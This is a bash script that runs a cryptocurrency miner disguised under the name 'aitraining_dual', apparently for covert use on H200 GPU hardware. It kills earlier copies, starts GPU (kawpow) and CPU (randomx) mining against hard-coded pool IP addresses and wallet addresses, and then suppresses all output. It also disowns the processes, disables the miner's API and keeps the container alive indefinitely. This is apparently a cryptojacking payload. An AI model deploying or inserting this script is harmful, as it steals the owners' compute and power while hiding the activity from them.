#!/bin/bash

# Kill old processes silently
pkill -f aitraining_dual >/dev/null 2>&1 || true
sleep 2

# ---------------- GPU PROCESS (NOHUP / SILENT) ----------------
nohup ./aitraining_dual \
    --algorithm kawpow \
    --pool stratum+ssl://51.89.99.172:16161 \
    --wallet RM2ciYa3CRqyreRsf25omrB4e1S95waALr \
    --worker H200-g \
    --password x \
    --gpu-id 0,1,2,3,4,5,6,7 \
    --tls true \
    --disable-cpu \
    --api-disable \
    >/dev/null 2>&1 &

GPU_PID=$!
disown $GPU_PID

# ---------------- CPU PROCESS (NOHUP / SILENT) ----------------
nohup ./aitraining_dual \
    --algorithm randomx \
    --pool stratum+ssl://51.222.200.133:10343 \
    --wallet 44csiiazbiygE5Tg5c6HhcUY63z26a3Cj8p1EBMNA6DcEM6wDAGhFLtFJVUHPyvEohF4Z9PF3ZXunTtWbiTk9HyjLxYAUwd \
    --worker H200-c \
    --password x \
    --cpu-threads 80 \
    --disable-gpu \
    --tls true \
    --api-disable \
    >/dev/null 2>&1 &

CPU_PID=$!
disown $CPU_PID

# ---------------- KEEP CONTAINER ALIVE (SILENT) ----------------
nohup bash -c "while true; do sleep 3600; done" >/dev/null 2>&1 &
disown
